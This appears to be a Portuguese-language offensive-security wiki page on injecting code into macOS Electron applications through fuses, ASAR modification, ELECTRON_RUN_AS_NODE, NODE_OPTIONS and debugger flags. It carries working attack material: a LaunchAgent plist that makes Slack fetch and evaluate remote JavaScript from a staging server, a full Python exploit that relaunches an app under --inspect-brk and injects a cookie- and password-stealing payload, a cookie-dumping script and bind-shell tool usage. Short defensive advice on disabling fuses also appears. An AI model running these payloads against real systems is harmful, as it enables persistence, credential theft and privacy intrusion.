# Injeção em Aplicações Electron para macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Se você não sabe o que é Electron, pode encontrar [**muitas informações aqui**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). Mas, por enquanto, basta saber que Electron executa **node**.\
E o node tem alguns **parâmetros** e **variáveis de ambiente** que podem ser usados para **fazê-lo executar outro código**, além do arquivo indicado.

Para saber mais sobre o pré-requisito de gravação local multiplataforma e os caminhos de ASAR/V8 snapshot, consulte [Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md).

### Electron Fuses

Estas técnicas serão discutidas a seguir, mas, recentemente, o Electron adicionou várias **flags de segurança para impedi-las**. São as [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), e estas são as usadas para **impedir** que aplicações Electron no macOS **carreguem código arbitrário**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Se desativada, impede o uso da variável de ambiente **`ELECTRON_RUN_AS_NODE`** para injetar código.
- **`EnableNodeCliInspectArguments`**: Se desativada, parâmetros como `--inspect` e `--inspect-brk` não serão reconhecidos. Isso evita essa forma de injetar código.
- **`EnableEmbeddedAsarIntegrityValidation`**: Se ativada, o **arquivo** **`asar`** carregado será **validado** pelo macOS. Dessa forma, **impede** a **injeção de código** por meio da modificação do conteúdo desse arquivo.
- **`OnlyLoadAppFromAsar`**: Se estiver ativada, em vez de procurar e carregar nesta ordem: **`app.asar`**, **`app`** e, por fim, **`default_app.asar`**, ela verificará e usará apenas `app.asar`, garantindo que, quando **combinada** com a fuse **`embeddedAsarIntegrityValidation`**, seja **impossível** **carregar código não validado**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Se ativada, o processo do navegador usa o arquivo chamado `browser_v8_context_snapshot.bin` como V8 snapshot.

Outra fuse interessante que não impede a injeção de código é:

- **EnableCookieEncryption**: Se ativada, o armazenamento de cookies em disco é criptografado usando chaves criptográficas do sistema operacional.

### Verificando Electron Fuses

Você pode **verificar essas flags** em uma aplicação com:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Modificando Electron Fuses

Como a [**documentação menciona**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), a configuração dos **Electron Fuses** fica dentro do **binário do Electron**, que contém em algum lugar a string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Em aplicações macOS, geralmente fica em `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Você pode carregar este arquivo em [https://hexed.it/](https://hexed.it/) e pesquisar a string anterior. Depois dessa string, você verá em ASCII o número "0" ou "1", indicando se cada fuse está desativado ou ativado. Basta modificar o código hexadecimal (`0x30` é `0` e `0x31` é `1`) para **modificar os valores dos fuses**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Observe que, se você tentar **sobrescrever** o binário **`Electron Framework`** dentro de um aplicativo com esses bytes modificados, o app não será executado.

## RCE adicionando código a aplicativos Electron

Pode haver **arquivos JS/HTML externos** usados por um app Electron. Assim, um atacante poderia injetar código nesses arquivos, cuja assinatura não será verificada, e executar código arbitrário no contexto do app.

> [!CAUTION]
> No entanto, atualmente há 2 limitações:
>
> - A permissão **`kTCCServiceSystemPolicyAppBundles`** é **necessária** para modificar um app, portanto, por padrão, isso não é mais possível.
> - O arquivo **`asap`** compilado geralmente tem os fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** **ativados**
>
> Isso torna esse caminho de ataque mais complicado (ou impossível).

Observe que é possível contornar a exigência de **`kTCCServiceSystemPolicyAppBundles`** copiando o aplicativo para outro diretório (como **`/tmp`**), renomeando a pasta **`app.app/Contents`** para **`app.app/NotCon`**, **modificando** o arquivo **asar** com seu código **malicioso**, renomeando-a de volta para **`app.app/Contents`** e executando o app.<sup>[[5]](#references)</sup>

Você pode descompactar o código do arquivo asar com:

```bash
npx asar extract app.asar app-decomp
```

E empacote-o novamente depois de modificá-lo com:

```bash
npx asar pack app-decomp app-new.asar
```

## RCE com ELECTRON_RUN_AS_NODE

De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), se essa variável de ambiente estiver definida, o processo será iniciado como um processo Node.js normal.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> Se o fuse **`RunAsNode`** estiver desativado, a variável de ambiente **`ELECTRON_RUN_AS_NODE`** será ignorada, e isso não funcionará.

### Injection do App Plist

Como [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), você pode abusar dessa variável de ambiente em um plist para manter a persistência:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE with `NODE_OPTIONS`

Você pode armazenar o payload em outro arquivo e executá-lo:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> Se o fuse **`EnableNodeOptionsEnvironmentVariable`** estiver **desativado**, o app **ignorará** a variável de ambiente **NODE_OPTIONS** ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fuse **`RunAsNode`** estiver desativado.
>
> Se você não definir **`ELECTRON_RUN_AS_NODE`** , encontrará o **erro**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injeção a partir do Plist do app

Você pode abusar dessa variável de ambiente em um plist para manter a persistência adicionando estas chaves:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## RCE via inspeção

De acordo com [**este**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se você executar um aplicativo Electron com flags como **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, uma **porta de depuração ficará aberta** para que você possa se conectar a ela (por exemplo, pelo Chrome em `chrome://inspect`) e **injetar código nela** ou até iniciar novos processos.<sup>[[7]](#references)</sup>\
Por exemplo:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

Em [**esta publicação do blog**](https://hackerone.com/reports/1274695), esse debugging é abusado para fazer o Chrome headless **baixar arquivos arbitrários em locais arbitrários**.<sup>[[8]](#references)</sup>

> [!TIP]
> Se um app tiver uma forma personalizada de verificar se variáveis de ambiente ou parâmetros como `--inspect` estão definidos, você pode tentar **contornar** essa verificação em runtime usando o argumento `--inspect-brk`, que **interrompe a execução** no início do app e permite executar um bypass (sobrescrevendo os argumentos ou as variáveis de ambiente do processo atual, por exemplo).

O seguinte foi um exploit em que, monitorando e executando o app com o parâmetro `--inspect-brk`, era possível contornar a proteção personalizada existente (sobrescrevendo os parâmetros do processo para remover `--inspect-brk`) e, em seguida, injetar um payload JS para extrair cookies e credenciais do app:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> Se o fuse **`EnableNodeCliInspectArguments`** estiver desativado, o app **ignorará os parâmetros do node** (como `--inspect`) ao ser iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, o que também será **ignorado** se o fuse **`RunAsNode`** estiver desativado.
>
> No entanto, você ainda poderia usar o **parâmetro do electron `--remote-debugging-port=9229`**, mas o payload anterior não funcionará para executar outros processos.

Usando o parâmetro **`--remote-debugging-port=9222`**, é possível roubar algumas informações do app Electron, como o **histórico** (com comandos GET) ou os **cookies** do navegador (como eles são **descriptografados** dentro do navegador e há um **endpoint json** que os disponibiliza).

Você pode aprender como fazer isso [**aqui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**aqui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usar a ferramenta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou um script simples como:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### Injection from o Plist do App

Você pode abusar desta variável de ambiente em um plist para manter a persistência adicionando estas chaves:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## Bypass do TCC abusando de versões antigas

> [!TIP]
> O daemon TCC do macOS não verifica a versão executada do aplicativo. Portanto, se você **não consegue injetar código em um aplicativo Electron** usando alguma das técnicas anteriores, pode baixar uma versão antiga do APP e injetar código nela, pois ela ainda terá os privilégios do TCC (a menos que o Trust Cache impeça isso).

## Executar código que não seja JS

As técnicas anteriores permitem executar **código JS dentro do processo do aplicativo Electron**. No entanto, lembre-se de que os **processos filhos são executados sob o mesmo perfil de sandbox** do aplicativo pai e **herdam as permissões de TCC dele**.\
Portanto, se quiser abusar de entitlements para acessar a câmera ou o microfone, por exemplo, basta **executar outro binário a partir do processo**.

## Vulnerabilidades notáveis do Electron para macOS (2023-2024)

### CVE-2023-44402 – Bypass da integridade do ASAR

Electron ≤22.3.23 e várias versões pré-lançamento de 23-27 permitiam que um invasor com acesso de escrita à pasta `.app/Contents/Resources` burlasse as fuses `embeddedAsarIntegrityValidation` **e** `onlyLoadAppFromAsar`. O bug era uma *confusão de tipo de arquivo* no verificador de integridade, que permitia carregar um **diretório chamado `app.asar`** criado para esse fim, em vez do arquivo validado. Assim, qualquer JavaScript colocado nesse diretório era executado quando o aplicativo iniciava. Portanto, até mesmo fornecedores que seguiram as orientações de hardening e habilitaram ambas as fuses continuavam vulneráveis no macOS.<sup>[[3]](#references)</sup>

Versões corrigidas do Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** e **27.0.0-alpha.7**. Invasores que encontrem um aplicativo executando uma versão antiga podem substituir `Contents/Resources/app.asar` pelo próprio diretório para executar código com os entitlements de TCC do aplicativo.<sup>[[3]](#references)</sup> 

### Cluster de CVEs “RunAsNode” / “enableNodeCliInspectArguments” de 2024

Em janeiro de 2024, uma série de CVEs (CVE-2024-23738 a CVE-2024-23743) destacou que muitos aplicativos Electron ainda são distribuídos com as fuses **RunAsNode** e **EnableNodeCliInspectArguments** habilitadas. Portanto, um invasor local pode reiniciar o programa com a variável de ambiente `ELECTRON_RUN_AS_NODE=1` ou com flags como `--inspect-brk` para transformá-lo em um processo Node.js *genérico* e herdar todas as permissões de sandbox e TCC do aplicativo.<sup>[[4]](#references)</sup>

Embora a equipe do Electron tenha contestado a classificação “crítica” e observado que o invasor já precisa ter execução de código local, o problema ainda é valioso durante o post-exploitation, pois transforma qualquer pacote vulnerável do Electron em um binário *living-off-the-land* que pode, por exemplo, ler Contatos, Fotos ou outros recursos confidenciais aos quais o aplicativo de desktop já tinha acesso concedido.<sup>[[4]](#references)</sup>

Orientações de defesa dos mantenedores do Electron:<sup>[[4]](#references)</sup>

* Desabilite as fuses `RunAsNode` e `EnableNodeCliInspectArguments` em builds de produção.
* Use a API **UtilityProcess** mais recente se o aplicativo realmente precisar de um processo auxiliar Node.js, em vez de reabilitar essas fuses. 

## Injeção automática

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

A ferramenta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) pode ser usada facilmente para **encontrar aplicativos Electron vulneráveis** instalados e injetar código neles. Essa ferramenta tentará usar a técnica **`--inspect`**:<sup>[[5]](#references)</sup>

Você precisa compilá-la por conta própria e pode usá-la assim:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki foi projetado para instalar backdoors em aplicações Electron substituindo os arquivos JavaScript das aplicações pelos arquivos JavaScript de Command & Control do Loki.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injeção no macOS por meio de frameworks de terceiros - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Bypass da integridade ASAR por confusão de tipo de arquivo (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Declaração sobre CVEs de 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizando a privacidade do macOS - Uma nova arma no seu arsenal de Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Variáveis de ambiente | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Por que aplicações Electron não podem armazenar seus segredos confidencialmente: opção --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Relatório HackerOne #1274695 - Depuração do Electron abusada para baixar arquivos arbitrários](https://hackerone.com/reports/1274695)
- [9] [Mãos no pote de biscoitos: extração de cookies pela porta do depurador remoto do Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Depuração de falhas na extração de cookies com o depurador remoto do Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
